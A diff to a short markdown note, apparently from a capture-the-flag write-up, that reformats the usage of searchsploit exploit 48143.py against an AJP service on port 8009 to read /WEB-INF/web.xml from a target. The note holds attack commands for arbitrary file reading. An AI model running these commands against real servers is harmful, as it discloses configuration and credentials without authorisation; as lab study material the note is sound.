@@ -2,7 +2,12 @@
 
 ### Searchsploit
 `searchsploit ajp`
-`python 48143.py -f /WEB-INF/web.xml $ip` or with specific port `python 48143.py -p $port -f /WEB-INF/web.xml $ip`
+
+`python 48143.py -f /WEB-INF/web.xml $ip` 
+
+Or with specific port `python 48143.py -p $port -f /WEB-INF/web.xml $ip`
+
+Or go with all default options simply `python 48143.py $ip` 
 
 In this box, it uses the default port 8009 already.
 
